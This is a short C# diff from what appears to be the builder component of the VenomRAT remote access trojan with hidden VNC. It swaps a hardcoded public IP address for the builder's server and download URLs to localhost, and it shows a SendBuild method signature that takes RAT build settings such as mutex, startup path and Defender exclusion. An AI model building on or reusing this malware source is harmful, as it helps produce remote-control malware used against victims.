@@ -5,11 +5,11 @@ namespace VenomRAT_HVNC.HVNC.WebBuilder
 {
     internal class WebBuilder
     {
-        public static string Server = "http://91.134.207.23:5337/venom/index.php";
+        public static string Server = "http://localhost:5337/venom/index.php";
 
         public static string Username;
 
-        public static string DownloadURL = "http://91.134.207.23:5337/venom/";
+        public static string DownloadURL = "http://localhost:5337/venom/";
 
         public static string SendBuild(string ip, string port, string id, string mutex, string startup, string path, string folder, string filename, string wdex, string hhvnc)
         {
